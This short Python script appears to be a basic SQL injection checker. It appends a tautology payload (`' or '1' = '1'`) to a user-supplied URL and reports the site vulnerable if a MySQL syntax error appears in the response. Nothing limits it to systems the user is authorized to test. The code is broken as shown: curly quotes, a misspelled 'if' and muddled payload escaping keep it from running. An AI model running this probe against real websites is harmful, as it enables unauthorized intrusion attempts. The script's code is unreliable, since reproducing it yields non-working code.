import sys
import urllib
import urllib.request

fullurl = input(“Please specify the full vulnerable url:  “)

resp = urllib.request.urlopen(fullurl + “=1\’ or \’1\’ = \’1\””)

body = resp.read()

fullbody = body.decode(‘utf-8’)

f “You have an error in your SQL syntax” in fullbody:

	print (“The website is classic SQL injection vulnerable!”)

else:

	print (“The website is not classic SQL injection vulnerable!”)
